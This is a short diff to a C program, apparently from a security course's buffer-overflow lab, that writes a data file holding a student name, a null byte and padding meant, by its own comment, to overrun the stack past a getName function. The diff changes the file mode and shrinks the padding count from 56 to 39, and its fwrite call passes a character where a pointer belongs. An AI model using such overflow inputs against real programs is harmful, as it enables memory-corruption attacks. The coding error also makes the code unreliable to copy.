@@ -20,7 +20,7 @@
 int main(void)
 {
     /* open a file that will be written to in write binary mode */
-    FILE *f = fopen("dataB", "wb");
+    FILE *f = fopen("dataB", "w");
 
     /* return error if file can't be opened */
     if (!f) return 1; 
@@ -28,10 +28,10 @@ int main(void)
     /* write student name and nullbyte to file */
     char *name = "Jonahjeff";
     fwrite(*name, 1, 9, f);
-    fputc(0, f);
+    fputc('\0', f);
 
     /* writes padding to overrun the stack and go past getName*/
-    for (int i = 0; i < 56; i++) {
+    for (int i = 0; i < 39; i++) {
         fputc('0', f);
     }
 
